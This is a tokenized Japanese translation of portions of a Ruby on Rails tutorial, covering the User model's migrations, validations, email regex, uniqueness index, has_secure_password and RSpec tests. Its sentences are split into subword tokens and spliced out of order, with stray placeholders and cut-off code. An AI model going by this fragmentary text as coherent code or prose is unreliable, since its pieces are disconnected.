▁\ ko de { S ec ur e R and o m . url safe _ base 64 } は 決 して 空 欄 には \ emph { なら なく な った } ので 、 User モデルの テストは パス するはずです 。
▁ データベース 上の 記憶トークン は 暗号化 されている ので 、 cookies から 取り出し た 記憶トークン は 、 データベース 上の 記憶トークン を検索する 前に 暗号化 する 必要がある 点に注意 してください 。
▁ 新しい リンクを レイアウト に追加する ときに 、 Bootstrap の 機能 を使用して ド ロ ッ プ ダ ウ ン メニュー を 実現 しましょう 。 詳 細 については 「\ href { http :// t w it ter . github . com / bootstrap / com p on ent s . html } { Bootstrap コンポーネント } ▁( 英語 )」 を参照してください 。
▁さらに 、 Rails のために 必要な Ruby の 知 識 は 、 通常の Ruby を学ぶ 過 程 とは \ emph { 異なります } 。 動的な Web アプリ を 作る ことができ れば それ で よい という のであれば 、 まず Rails を学ぶ ように し 、 Ruby については 当 分 の 間 、 必要 が生じ た場合 に のみ 学習 する ことをお勧めします 。
▁ そう ではなく 、 真 の Rails \ emph { エ キ ス パ ート } になり たい のであれば 、 Ruby を さらに 深 い レベル まで 理解 する必要があります 。 本書 は 、 そのため の 開発 技術 の基礎 を 築 く 助 け になる でしょう 。
▁ ある ヘルパー が 特定の コントローラ で のみ 使用する も のであれば 、 それ に対応する ヘルパー ファイル に置く 必要があります 。 たとえば StaticPages コントローラ 用 ヘルパーは 、 通常 \ ko de { app / helpers / static _ pages _ helper . rb } になります 。
▁ Home ページの タイトル 確認 用 に テスト を更新する 。
▁ここで 、 単 に 既存の テストコード を修正する だけ ではなく 、 新しい テストコード を追加した 理由 について 考え て みてください
▁ここで 、 Ruby の 関数 は ▁\ emph { 暗 黙 の 戻り値 } を持つ という ことに注意してください 。 これは 、 最後に 評価 された 式 の値 が自動的に 返される ことを 意味 します 。 この場合 、 引数 の \ ko de { string } が 空 かどうか に 基 づ いた 2 つの メッセージ 文字列 のうち のいずれか が返されます 。
▁Rails では 、 このような ハッシュの ハッシュ ▁( または \ emph { ネスト された ハッシュ }) ▁ が 大 量 に 使われ ています 。 実際の 使用 例 は \ ref { sec : signup _ failure } で説明します 。
▁たとえば 、\ ko de { : success } と \ ko de { : error } という ▁2 つの 状態 を持つ ▁\ ko de { flash } ▁ という名前の ハッシュ について 考えてみましょう 。
▁=> ▁ { : success => " I t ▁ w or ke d ! ", ▁: error => " I t ▁ failed . "}
▁ 結 論 として は 、 この データモデル は メ ン テ ナ ン ス の 観 点 から 見 て 悪 夢 です 。 ユーザー名 を変更する たびに 、\ ko de { users } テーブル の その レコード だけで なく 、\ ko de { followed _ users } テーブル と \ ko de { followers } テーブル の 両方 について 、\ emph { その ユーザー を含む すべての 行 } を更新し なければ なら なくなります 。
▁\ ko de { : data - turbolinks - t rack } という シンボル を作成し よう とします が 、 シンボル では ハ イ フ ン を使用 できない ため 、 この 記 法 は 無効 です 。
▁この 例 では Ruby ▁1. 9 . 3 を 前 提 と しています 。
▁{0} 図 4 . 3 {/0} {1} ▁ StaticPages コントローラの 継 承 階層 。 {/1}
▁ まとめ ると 、 {0}{1} 第 6 章 {/1}{/0} から {2} {1} 第 10 章 {/1} {/2} を通して 、 Rails の ログイン と 認証システム を ひ と とおり 開発 します 。
▁ この章 は 長 い う え に 、 学ぶ ことが たくさん あります 。 特に 、 これまで データ モデリング を した ことが ない 人 にとって は 、 も しか すると 、 これまで とは 違 った 難 し さ を 感 じ る かもしれません 。
▁しかし 、 この章 が 終 わ る まで には 、 ユーザー情報 の 検証 、 保存 、 取得 が できる 極めて 強力な システム を作成します 。
▁ メールアドレスを ユーザー名 に した ことで 、 理 屈 の 上で は 将来 ユーザー 同士 で 通 信 できるように 拡 張 できる 可能性 が 開 か れ ます 。
▁ カラム を この ように 名 付け ること によって 、 Active ▁Record で User オブジェクトの 属性を 利用 できるようになります 。
▁それでは 実際 どのように 動作する のか 見 てみましょう
▁上の コマンド は コントローラ を作成し ましたが 、 同様に モデル を作成する コマンド として 、\ ko de { generate ▁ model } があります 。
▁create ▁ db / migrate / [ timestamp ] _ create _ users . rb
▁invo ke ▁ rspec
▁create ▁ spec / models / user _ spec . rb
▁( コントローラ 名 には 複数形 を 使い 、 モデル名 には 単数形 を 用 いる という 慣習 を 頭 に 入 れ て おいてください 。 コントローラ は Users で モデル は User です )。
▁\ ko de { name : string } や \ ko de { email : string } オプション の パラメータ を 渡す こと によって 、 データベース で 使用 したい 2 つの 属性を Rails に 伝 え ます 。 このとき に 、 これらの 属性 の 型 情報 も 一 緒 に 渡します ▁( この場合は \ ko de { string })。
▁{0} 図 6 . 3 {/0} {1} \ href { http :// sqlite browser . source f org e . net /}{ SQLite ▁D at a base ▁B row s er } と 作成した \ ko de { users } テーブル \ href { http :// railstutorial . org / images / figure s / sqlite _ database _ browser - full . png }{( 拡大 ) }{/1}
▁\ emph { Rails チュートリアル } で 使用されている もの すべて を含め 、 ほとんど の マイグレーション が \ emph { 可 逆 } です 。 これは 、\ ko de { db : r o ll b ack } という Rake タスク で 変更を 取り 消 せる ことを 意味 します 。 これを “ マイグレーション の 取り 消 し ▁( migrate ▁d own ) ” と呼びます 。
▁ただし その 前に 、 完了 させ て お か なければならない 作業 が 2 つ あります 。
▁ モデル 注 釈
▁\ ko de { Gemfile } に \ ko de { an not at e } ▁gem を追加する 。
▁( この 注 釈 機能 は 本番 アプリ では 不要な ので 、\ ko de { an not at e } ▁gem は \ ko de { group ▁: development } ブロック の中に 書き ます ▁(\ ko de { group ▁: test } に 書いた とき と 同じ要領で す ) )。
▁次に \ ko de { bundle ▁install } を実行して インストール します 。
▁これにより \ ko de { an not at e } コマンド が 使えるようになります 。 これ を実行すると 、 モデル ファイルに データモデル を 含 んだ コメント が追加され ます 。
▁A n not at ed ▁ (1) : ▁User
▁ 変更 の 結果を リスト \ ref { code : an not at ed _ user _ model } に示します 。
▁ 注 釈 が追加され た User モデル 。
▁# ▁= = ▁S ch e ma ▁ In form ation
▁# ▁ T able ▁name : ▁ users
▁# ▁id ▁: integer ▁ not ▁ null , ▁ primary ▁ key
▁# ▁name ▁: string ( 2 5 5 )
▁# ▁ email ▁: string ( 2 5 5 )
▁# ▁ created _ at ▁: date time
▁# ▁ updated _ at ▁: date time
▁ データモデル を モデル ファイル の中に コメント として 残 しておく と 、 モデルに どんな 属性 がある か を 楽 に 思い 出 せ ます 。 なお 簡潔 さ の ため 、 本書 で 今後 使用する コード には この 注 釈 を 付け ません
▁( も し 注 釈 を 最新の 状態 に 保 ち たい のであれば 、 データモデル が 変わる たびに \ ko de { an not at e } を実行し なければならない ことに注意してください )。
▁ アクセス 可能な 属性
▁この 行 は 、 モデルの どの 属性を \ emph { アクセス 可能 } に するか を Rails に 伝 え ます 。 たとえば 、 外部 のユーザー ▁( Web ブラウザ を使用して リクエストを 送信 する ユーザー など ) ▁ が 変更 しても よい 属性 を指定します 。
▁\ ko de { name } と \ ko de { email } 属性を アクセス 可能 にする 。
▁ モデルに attr _ access i b le を 書 か ない場合は 、 デフォルトで 「 モデルの \ emph { すべての } 属性 が アクセス 可能 」 になります 。
▁ 開発 ログ ▁( log / development . log ) ▁ を t a il ▁- f した ま ま 上 を実行して いた 場合 、 実行 後に 新しい 行 が 何も 表示 され ないこと に 気 付 いた 方 も いる と思います 。
▁これは 、\ ko de { User . new } を実行して も 単 に Ruby オブジェクトを メモリ 上 に 作成する だけで 、 データベースに は アクセス しない ためです 。
▁この ユーザー オブジェクトを データベースに 実際に 保存 するには 、\ ko de { user } 変数 に対して \ ko de { save } メソッドを 呼 び ます 。
▁Active ▁Record によって 多数の メソッドが 提供され ている ので 、 本書 では 生 の SQL を 書く 必要 が ありません 。 従って 、 本書 では これ 以降 は SQL コマンド について の 説明 を省略 します 。
▁ created _ at : ▁"2013-03-11 ▁ 00 : 5 7 : 4 6 ", ▁ updated _ at : ▁"2013-03-11 ▁ 00 : 5 7 : 4 6 ">
▁\ ko de { " 20 1 3 - 0 3 - 11 ▁ 00 : 5 7 : 4 6 "} という タイムスタンプ が 気 になった 方 も いる と思います が 、 著者 はこの 箇所 を 真 夜 中 過 ぎ に 書いた わけではありません 。 実は この タイムスタンプ は \ href { http :// en . w ikipedia . org / wiki / Co or d in at ed _ U n i ver s al _ Time } { 協 定 世界 時 ▁( UTC ) } ▁ に合わせて あります 。 これは \ href { http :// en . w ikipedia . org / wiki / G re en w i ch _ M e an _ Time } { グ リ ニ ッ ジ 標準 時 ▁( G M T ) } ▁ と同様 、 標準 時間 として 使用されます 。
▁\ ko de { user . updated _ at } の値 に 注目してください 。
▁"2013-03-11 ▁0 1 : 0 5 : 2 4 ", ▁ updated _ at : ▁"2013-03-11 ▁0 1 : 0 5 : 2 4 ">
▁#< User ▁id : ▁ 3, ▁name : ▁" F oo ", ▁ email : ▁" foo @ bar . com ", ▁ created _ at : ▁"2013-03-11
▁0 1 : 0 5 : 4 2 ", ▁ updated _ at : ▁"2013-03-11 ▁0 1 : 0 5 : 4 2 ">
▁ 奇 妙 な ことに 、\ ko de { destroy } は \ ko de { create } と同じ ように そのオブジェクト 自身 を返します が 、 その 返 り 値 を使用して も 、 もう一度 \ ko de { destroy } を 呼 ぶ ことはできません 。
▁ そして 、 おそらく さらに 奇 妙 な ことに 、\ ko de { destroy } された オブジェクトは 以下のように まだ メモリ 上 に 残 っています 。
▁ オブジェクトが 本当に 削除 された かどうかを どのように して 知 れば よいでしょう か 。
▁この あ たり で 、 Active ▁Record で ユーザー オブジェクト を検索する 方法 を 学 んで みましょう 。
▁\ ko de { find _ by _ email } は 、\ ko de { users } テーブル の \ ko de { email } 属性 に基づいて Active ▁Record が自動的に 生成 する メソッド です
▁( ご 想 像 ど お り 、 Active ▁Record は \ ko de { find _ by _ name } という メソッド も 自動的に 生成 します )。
▁Rails ▁4.0 以降 では 、 属性 を検索する 場合には 上の メソッド に 代 え て より 普 遍 性 の 高 い \ ko de { find _ by } メソッド を使用すること が 推 奨 されています 。 このメソッド では 属性を ハッシュ 形式 で 渡します 。
▁ created _ at : ▁"2013-03-11 ▁ 00 : 5 7 : 4 6 ", ▁ updated _ at : ▁"2013-03-11 ▁ 00 : 5 7 : 4 6 "> ,
▁"2013-03-11 ▁0 1 : 0 5 : 2 4 ", ▁ updated _ at : ▁"2013-03-11 ▁0 1 : 0 5 : 2 4 "> ]
▁=> ▁"2013-03-11 ▁ 00 : 5 7 : 4 6 "
▁=> ▁"2013-03-11 ▁0 1 : 3 7 : 3 2 "
▁さらに 、 メールアドレスを ユーザーが ログイン する とき の 一意 の ユーザー名 として 使 お う と している ので 、 メールアドレス が データベース 内で 重複 すること の ないように する 必要 もあります 。
▁Active ▁Record では \ emph { 検証 ▁( バリデーション : ▁ validation ) ▁ } を使用して そのような 制 約 を与える ことができます 。
▁\ ref { sec : signup _ failure } では 、 ユーザーが 制 約 に 違 反 したときに 、 検証 機能 によって自動的に 表示される 有 用 な エラーメッセージ を お 見 せ します 。
▁ サンプルアプリケーションの 他の 機能 と同様 、 User モデル への 検証 の 追加 も テスト駆動開発 ▁( T D D ) ▁ で 行います 。
▁ 今回は User モデル を作成 したときに
▁ 実 質 的に 空 になっている デフォルトの User ▁ spec 。
▁上のコードでは \ ko de { p end ing } メソッド だけ が 置 か れ ており 、 何か 意味 のある コード で spec を 埋 め るように 促 しています 。
▁この コードの 効果 は 、 空 のテスト 用 データベース を 用 意 して User モデルの spec を実行する ことで 確認 できます 。
▁F in i sh ed ▁in ▁ 0.0 19 99 ▁ sec on d s
▁1 ▁ example , ▁0 ▁ failure s , ▁1 ▁ p end ing
▁P end ing :
▁User ▁ add ▁ some ▁ example s ▁to ▁( or ▁ delete )
▁ / Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec . rb
▁( No t ▁ Y e t ▁I m p le m ent ed )
▁ 多くの システム では 、 p end ing の spec は コマンドライン 上で 黄 色 で 表示 されます 。 黄 色 は 、 成功 ▁( 緑 ) ▁ と 失敗 ▁( 赤 ) ▁ の 中 間 を 意味 します 。
▁ 環境 を 整 え るために テスト 環境 用 データベース を作成する コマンド を実行する のは これ が 初めて です 。
▁ マイグレーション の 後 で た ま に Rake タスク が 実行 でき なく な ること があり 、 多くの 人 が これ に 戸 惑 います 。
▁さらに 、 テスト データベース は た ま に 壊 れる ことが あるので 、 その 場合は リセット が必要です 。
▁ も し テストスイート が 理由 も なく 壊 れる ようなこと があれば 、\ ko de { rake ▁test : prepare } を実行して 、 この問題 が 解決 するか 確認 してみてください 。
▁ これはリスト \ ref { code : user _ spec } で使用されていま した 。
▁\ ko de { : name } と \ ko de { : email } 属性 のテスト 。
▁これらの テストは 、 RSpec で 使われ る \ emph { 論理値 の 慣習 } に 依 存 しています 。 以下のコード は 、
▁以下の RSpec のコード で テスト できます 。
▁ このような テスト の おかげで 、 テスト駆動開発 を ベース に 新しい 属性 や メソッドを User モデル に追加 することができます 。 さらに 、 すべての \ ko de { User } オブジェクトが これらの メソッド に応答する 必要がある という 仕 様 も ここで 明 ら か に なりました 。
▁\ ko de { rake ▁test : prepare } を実行して テスト 環境 用 データベース を 用 意 した ので 、 テストは パス するはずです 。
▁最初に \ ko de { name } 属性 の 存 在 を確認する テスト を行い ましょう 。
▁次に 、 その 検証 を コメントアウト し 、 失敗する テストを 書き 、 そして 検証 の コメントアウト を 解 除 することで 、 その テストを パス させ られ る かどうかを確認 します 。
▁この 手 続 き は 、 このような 単純な テストでは 、 大 げ さ で 気 取 った もの に 感 じ られ る かもしれません 。 しかし 著者 は これまで に 、 実際には 見 当 違 い な ことを テスト している 「 単純な 」 テストを 山 ほど 見 てきました 。 テスト駆動開発 を 慎 重 に 進め ること は 、 結 局 は 「 私 た ち が 正しい 事 項 を テスト している 」 という 自 信 を得る 為 の \ emph { 唯 一 の } 方法 な のです 。
▁( 上 で紹介した コメントアウト の テクニック は 、 コードは あって も テストが ど こ にも ない ような \ href { http :// en . w i k tion ary . org / wiki / que ll e _ h or re ur }{\ emph { ひ ど い } } アプリケーションを 急 い で 救 出 するときに も 役 に 立 ち ます )。
▁self を省略した 結果を リスト \ ref { code : validates _ presence _ of _ name } に示します 。
▁\ ko de { user . save } は \ ko de { false } を返し ました 。 これは 保存 に 失敗した ことを 意味 します 。
▁ 最後の コマンド は 、\ ko de { valid ?} メソッドで 、 オブジェクトが ひとつ 以上 の 検証 に 失敗した ときに \ ko de { false } を返します 。 すべての 検証 が パス した 場合は \ ko de { true } を返します 。
▁ 失敗する テストを 確認 するために 検証 を コメントアウト する 。
▁# ▁validates ▁: name , ▁ presence : ▁true
▁ これはリスト \ ref { code : failing _ validates _ name _ spec } で使用されていま した 。
▁\ ko de { name } 属性 の 検証 に対する 、 失敗する テスト 。
▁1 番目の 新しい テスト 例 は 、 単なる 健 全 性 チェック です 。 これ を使用して 、 まず \ ko de {@ user } という subject が 有効 かどうかを確認 します 。
▁ この場合 、 以下の メソッド 呼び出し の 結果を テスト することができます 。
▁2 番目の テストは 、 まず ユーザーの name に 無効な 値 ▁( blank ) ▁ を 設定 し 、\ ko de {@ user } オブジェクトの 結果 も 無効 になる ことを テスト して 確認 します 。
▁ユーザーの name に 無効な 値 ▁( blank ) ▁ を設定する には \ ko de { before } ブロック を使います 。 次に ユーザー オブジェクトの 結果 が 無効 である ことを確認します 。
▁ この時点で テストが 失敗する ことを確認 してください 。
▁4 ▁ example s , ▁1 ▁ failure
▁4 ▁ example s , ▁0 ▁ failure s
▁もちろん 、 今度は メールアドレス の 存在性 も 検証 しましょう 。
▁\ ko de { email } 属性 の 存在性 のテスト 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁\ ko de { name } 属性 と \ ko de { email } 属性 の 存在性 を検証する 。
▁これで すべての テストにパス するはずです 。 これ で 、 存在性 の 検証 は 完成 しました 。
▁\ ko de { name } 属性 の 検証 には 、 空 文字 でない 、 名前 が 5 1 文字 未 満 である という 最 小 限 の 制 約 しか 与え て いません で した 。 \ ko de { email } 属性 の場合は 、 もっと 厳 重 な 要求 を 満 た さ なければなりません 。
▁最初に 、 有効な メールアドレス と 無効な メールアドレス の コレクション に対するテスト を行い ましょう 。
▁=> ▁[" user @ foo .
▁C O M ▁A _ U S - ER @ f . b . org ▁f r st . l st @ foo . j p ▁a + b @ baz . c n ]
▁ ところで 、 この 正規表現 パターン は どう や って 作 れば よい の でしょう か 。
▁ 大文字 小文字 を 無視 する オプション
▁ ところで 、 公式 標準 による と メールアドレス に 完全に 一致する 正規表現 は 存 在 する の だ そう です 。 しかし 、 苦 労 して 導入 する ほど の 甲斐 はありません 。
▁ 驚 いた ことに 、 公式 標準 による と \ ko de { " Michael ▁Hartl " @ example . com } のような ク ォ ート と スペース を使用した メールアドレス も 有効な の だ そう です 。
▁上の 正規表現 には 少し だけ 残 念 な 点 があります 。 \ ko de { foo @ bar . . com } のような ドット の 連 続 を 誤 り として 検出 できません 。
▁{0} 図 6 . 4 {/0} {1} 素晴らしい 正規表現 エディタ \ href { http :// www . r ub ul ar . com /}{ R ub ul ar } 。 \ href { http :// railstutorial . org / images / figure s / r ub ul ar - full . png }{( 拡大 ) }{/1}
▁これで テスト はすべて パス するはずです
▁( 実際 、 この 有効な メールアドレス のテスト は これまで い つ も パス し てきました 。 正規表現 の プログラミング は 間 違 い が 起 こ り やすい ことで 有 名 なので 、 ここで 行 な っている 有効な メールアドレス のテスト は 、 主 として \ ko de { V A L ID _ E M A I L _ RE G E X } に対する 形式 的な 健 全 性 チェック に 過 ぎ ません )。
▁ 残 る 制 約 は 、 メールアドレス が 一意 であることを 強 制 する もの だけ と なりました 。
▁ 今回 も いつものように テスト を作成する ところ から 始 め ます 。
▁ これはリスト \ ref { code : validates _ uniqueness _ of _ email _ test } で使用されていま した 。
▁上のコードは 、\ ko de {@ user } と同じ メールアドレス の ユーザーを 事 前に 作成する 手法 です 。 今回は 、 同じ 属性 の ユーザーを 作る ために 、\ ko de {@ user . dup } を使っています 。 同じ 属性 の ユーザーが 保存 された 後 では 、 元の \ ko de {@ user } と同じ メールアドレス が 既に データベース 内に 存 在 している ため 、\ ko de {@ user } は 無効 になります 。
▁ これはリスト \ ref { code : validates _ uniqueness _ of _ email } で使用されていま した 。
▁ 技術 的に は 、 メールアドレス のうち ドメイン 名 部分 だけ が ▁( 本 当 は ) ▁ 大文字 小文字 を 区別 しません 。 foo @ bar . com は 、 本 来 は d F oo @ bar . com とは 別の アドレス です 。
▁ これはリスト \ ref { code : validates _ uniqueness _ of _ email _ case _ in s en s it ive _ test } で使用されていま した 。
▁ 大文字 小文字 を 区別 しない 、 重複 する メールアドレス の 拒 否 のテスト 。
▁この テストは 最初の メールアドレス の 重複 テスト と同じ ことを しています が 、 大文字 に変換 した メールアドレスを 使っている 点が 異なります 。
▁ 現在の 一意性 検証 では 大文字 小文字 を 区別 している ため 、\ ko de { user _ with _ s am e _ email . valid ?} は \ ko de { true } になります 。 しかし 、 ここでは \ ko de { false } になる 必要があります 。
▁上のコードでは 、 単 に \ ko de { true } を \ ko de { case _ s en s it ive : ▁false } で 置き換え た だけ である ことに注目してください 。 Rails は この場合 、\ ko de { : uniqueness } を \ ko de { true } と 判 断 します 。
▁ この時点で 、 アプリケーション は 重要な 警 告 と 共 に メールアドレス の 一意性 を 強 制 し 、 テストスイート も パス するはずです 。
▁ 上 で示した 警 告 には 、 1 つ 小さな 問題 があります 。
▁\ ko de { validates ▁: uniqueness } を使用して も 、 一意性 は 保 証 されません 。
▁ い った い 何 が 問題 な の でしょう か 。
▁以下の シ ナ リ オ を見 てください 。
▁上の シ ナ リ オ が 信 じ が たい もの のように 思える かもしれませんが 、 どう か 信 じ てください 。 Rails の Web サイト では 、 ト ラ フ ィ ッ ク が多い ときに このような 問題 が発生する 可能性 がある のです 。
▁ 幸 い 、 解決 策 の実装 は 簡単 です 。 実は 、 この問題 は データベース レベル でも 一意性 を 強 制 する だけで 解決 します 。
▁ 具体的には 、 email カラム に データベースの \ emph { インデックス } を作成し 、 その インデックス が 一意 であることを 要求 します 。
▁ データモデル の 変更 が 必要 になった ら その 都 度 マイグレーション を行う の が Rails 流 です 。
▁ 残 念 な ことに 、 メールアドレス の 一意性 を 保 証 するために は 、 もう 1 つ や ら なければならない ことがあります 。 それ は 、 メールアドレス をデータベースに保存する 前に すべての 文字 を 小文字 に変換 することです 。
▁その 理由 は 、 データベースの ア ダ プ タ が 常に 大文字 小文字 を 区別 する インデックス を 使っている とは 限 らない からです
▁ 著者 の システム 上の SQLite と Heroku 上の PostgreSQL で 直接 実 験 して み た ところ 、 この 手順 は 実際に 必要 であること が わかり ました 。
▁これ を行う には \ href { http :// en . w ikipedia . org / wiki / C all b ack _ ( com put er _ sc i en ce ) }{\ emph { コールバック } } という テクニック を 利用 します 。 コールバック とは 、 Active ▁Record オブジェクトが 持 続 している 間 の ど こ か の 時点 で 、 Active ▁Record オブジェクト に 呼び出し ても ら う メソッド です ▁( Rails ▁API の 「\ href { http :// api . rubyonrails . org / v 4 . 0.0 / classes / ActiveRecord / Callbacks . html } { コールバック の 登録 ポ イン ト } ▁( 英語 )」 を参照してください )。
▁self を省略した 結果を リスト \ ref { code : email _ downcase } に示します 。
▁これで 、 先に 述 べ た ア リ ス の シ ナ リ オ は うまく い く ようになります 。 データベース は 、 最初の リクエスト に基づいて ユーザーの レコード を保存し ます が 、 2 度 目 の 保存 は 一意性 の 制 約 に 反 する ので 拒 否 します
▁( Rails の ログ に エラー が 出力 されます が 、 害 は 生 じ ません 。
▁ 本 の中で 、 与えられた 言 葉 ▁( 例 えば 、 “ foo bar ” ) ▁ が 出 て く る 箇所 をすべて 見つけ るために は 、 ページを 端 から 順に め く って 最 後 まで 探 す 必要があります 。
▁この節では 、 ユーザーに 最後の 属性 を追加します 。 セキュア パスワード は 、 サンプルアプリケーション で ユーザーを 認 証 するために 使用します 。
▁ セキュア な パスワード の実装 は 、\ ko de { has _ secure _ password } という Rails の メソッド を呼び出す だけで ほとんど 終わっ てしまいます ▁( このメソッドは Rails ▁ 3.1 から 導入 されました )。
▁このメソッド 1 つ だけで セキュア な パスワード の実装 が ほとんど 終わっ てしまう ので 、 逆 に この 機能を 一 から 手 作り する のは 簡単 ではありません 。
▁( スクリーンキャスト は 、 このような 一 から の 手 作り 開発 手順 を 解 説 するのに 向 い ています 。 この 課題 を 十分 に 理解 したい 方は 「\ href { http :// railstutorial . org / sc re en casts } { Ruby ▁on ▁Rails ▁Tutorial ▁ sc re en casts } ▁( 英語 )」 を参照してください )。
▁このとき 、 システム 環境 によって は 以下の 警 告 が 出力 される ことがあります 。
▁ ma ke : ▁ / us r / bin / g c c - 4 . 2 : ▁ No ▁ s u ch ▁ file ▁ or ▁ directory
▁ この問題 を修正する には 、\ ko de { c lang } フラグ を追加して RVM を 再 インストール します 。
▁ これはリスト \ ref { code : respond _ to _ password _ digest } で使用されていま した 。
▁User オブジェクト に \ ko de { password _ digest } カラム がある ことを確認する テスト 。
▁この テストが パス するには 、 最初に \ ko de { password _ digest } カラム 用の 適切な マイグレーション を生成します 。
▁上の コマンド の最初の 引数 は マイグレーション 名 、 次の 引数 は 作成する 属性 の名前 と 型 です
▁ これはリスト \ ref { code : generate _ user _ model } で使用されていま した 。
▁ マイグレーション 名 は 自由に 指定できます が 、 上の ように 末尾 を \ ko de { _ to _ users } に しておく ことをお勧めします 。 こう しておく と 、\ ko de { users } テーブル に カラム を追加する マイグレーション が Rails によって自動的に 作成される からです 。
▁上のコードでは 、\ ko de { add _ column } メソッドを使用して \ ko de { password _ digest } ▁ カラム を \ ko de { users } テーブル に追加 しています 。
▁リスト \ ref { code : respond _ to _ password _ digest } のとき
▁ パスワード 確認 の 強 制 は コントローラの 階層 でも 行う ことができます が 、 モデル の中で Active ▁Record を使用して 制限 を与える の が 慣習 になっています 。
▁その ためには 、\ ko de { password } 属性 と \ ko de { password _ confirmation } 属性を User モデル に追加 し 、 レコード をデータベースに保存する 前に 2 つの 属性 が 一致する ように 要求 します 。
▁ これまで に 使用 した 属性 と異なり 、 パスワード 関連 の 属性 は 「\ emph { 仮 想 }」 にする 点に注意 してください 。 つまり 、 これらの 属性 は 一時 的に メモリ 上 に置き 、 データベースに は 保存 され ないように します 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁\ ko de { password } 属性 と \ ko de { password _ confirmation } 属性 をテストする 。
▁上のコードでは 、 以下のように \ ko de { User . new } ハッシュの 初期化 に \ ko de { : password } と \ ko de { : password _ confirmation } を追加し ていることに注目してください 。
▁ パスワード は 空 欄 で あって は なら ないので 、 パスワード の 存 在 確認 テストを 別 に追加します 。
▁ パスワード の 不 一 致 テストは この すぐ 後 に追加する ので 、 上のコード では パスワード と パスワード の 確認 を 両方 とも 空 欄 に することで パスワード の \ emph { 存 在 } 確認 テストを 行 な っています 。
▁ パスワード と パスワード の 確認 が 一致する かどうか も テスト する必要があります 。
▁ これはリスト \ ref { code : password _ tests } で使用されていま した 。
▁ パスワード と パスワード の 確認 をテストする 。
▁self を省略した 結果を リスト \ ref { code : initial _ passing _ password _ tests } に示します 。
▁ 最初の パスワード テストを パス する ように する 。
▁ 現在の パスワード 関連 テストが すべて パス する ように なり 、 他の 多くの テスト にも パス する ようになります 。
▁ テスト駆動開発 用 に \ ko de { has _ secure _ password } を コメントアウト する 。
▁# ▁has _ secure _ password
▁ パスワード 機 構 という パ ズ ル の 最後の ひ と かけ ら は 、 ユーザーを メールアドレス と パスワード に基いて 取得 する手段 です 。
▁この 作業 は 2 つ に 分 け る の が 自 然 です 。 最初に 、 ユーザーを メールアドレス で 検索 します 。 次に 、 受け 取 った パスワード で ユーザーを 認 証 します 。
▁ 次の 手順 は 、\ ko de { authenticate } メソッドを使用して 、 受け 取 った パスワード が ユーザーの パスワード と 一致する ことを確認します 。
▁ 受け 取 った パスワード が ユーザーの パスワード と 一致する と ユーザーが 返 され 、 一 致 し ない場合は \ ko de { false } が返されます 。
▁ これまで 同様 、 RSpec を使用して \ ko de { authenticate } メソッド への 要求 内容 を 表現 することができます 。
▁ただし 、 この テストは これまで よりも 高度な 内容 になる ため 、 いくつか に 分割 して 説明します 。 RSpec が 初めて の 方は 、 この節 を 繰り返し 読んで みてください 。
▁最初に 、 User オブジェクトが \ ko de { authenticate } に応答する ことを 要求 します 。
▁次に 、 パスワード が 一致する 場合 と 一 致 し ない場合 について それぞれ 記述 します 。
▁ let (: f ound _ user ) ▁ { ▁User . find _ by ( email : ▁@ user . email ) ▁ }
▁上のコード で 、\ ko de { before } ブロック は ユーザーを データベースに 事 前に 保存 します 。 これにより 、\ ko de { find _ by } メソッドが 動作する ようになります 。 このメソッド を \ ko de { let } メソッドで 以下のように テスト します 。
▁ これまで いくつかの 演習 で \ ko de { let } メソッドを使用して き ましたが 、 今回の ように チュートリアル の 本 文 で 言 及 する のは これ が 初めて です 。
▁ 以下のコード に 注目してください 。
▁上のコードでは \ ko de { let } が もう一度 使用 され ており 、 さらに \ ko de { spec if y } という メソッド も 使用 されています 。
▁ 実は 、 この spec if y は \ ko de { it } と 同 義 であり 、\ ko de { it } を使用すると 英語 として 不 自 然 な 場合に これ で 代 用 することができます 。
▁\ text tt { let } メソッド
▁ RSpec の \ text tt { let } メソッドを使用すると 、 テスト 内で 簡単に ローカル変数 を作成する ことができます 。
▁ 文法 は 一 見 奇 妙 ですが 、 動作 は 変数 への 割り当て と似ています 。
▁\ text tt { let } の 引数 は シンボル であり 、 さらに ブロック を 引数に 取り ます 。 その ブロック は 、 この シンボル 名 を持つ ローカル変数 に 値 を返します 。
▁\ text tt { f ound _ user } という 変数 が作成され 、 その 値 は \ text tt { find _ by } の 返 し 値 に 等 しく なります 。
▁これにより 、 この 変数 は すべての \ text tt { before } または \ text tt { it } ブロック で テスト の 間 利用 できるようになります 。
▁(\ href { http :// en . w ikipedia . org / wiki / M e m o i z ation }{\ emph { メ モ 化 } } は 技術 用 語 であり 、 決 して ▁" me m or ize " ▁ の 誤 り では \ emph { ありません }) ▁ 。
▁ この場合 、\ text tt { f ound _ user } 変数 は \ text tt { let } によって メ モ 化 され 、\ text tt { find _ by } メソッドが 実際に 呼び出される のは User モデルの spec が 実際に 実行される とき だけ となります 。
▁最後に 、 セキュリティ の 常 道 として 、 パスワード の 長さ 検証 をテストします 。 以下のコード では 、 パスワード は 6 文字 以上 であることを 要求 します 。
▁ パスワード の 長さ と \ ko de { authenticate } メソッド をテストする 。
▁しかし 今 では 、 Web 開発者 が 認証システム という もの を 以前 よりも 深 く 理解 する ように なり 、 最新の Rails には 認証システム も 同 梱 される ようになりました 。
▁ ここ まで 実装 を 進め てきた ので 、 あ と ほ ん の 数 行 を追加して セキュア パスワード の実装 を 完了 し 、 テストスイート を 緑色 ▁( 成功 ) ▁ に しましょう 。
▁( パスワード の 存 在 検証 と 確認 は \ ko de { has _ secure _ password } によって自動的に 追加 されます 。 )
▁この 実装 が 唯 一 手 間 のか か る 箇所 ですが 、 最新の Rails では \ ko de { has _ secure _ password } を使用する だけで これらの 機能 をすべて 自由に 利用 できます 。
▁ データベースに \ ko de { password _ digest } カラム を 置 く という 条件 さ え 守 れば 、 上の メソッドを モデル に追加する だけで 新規ユーザー の作成 と 認 証 を セキュア に することができます 。
▁(\ ko de { has _ secure _ password } の実装 に 興 味 のある 方は 、\ href { https :// github . com / rails / rails / b lo b / master / active model / lib / active _ model / secure _ password . rb }{\ text tt { secure _ password . rb } の ソースコード } を参照 してみる と よいでしょう 。 この ソースコード には 十分 な 解 説 があり 、 しか も 読み や す く でき ています 。
▁その コード に 、 以下の行 がある ことに注目してください 。
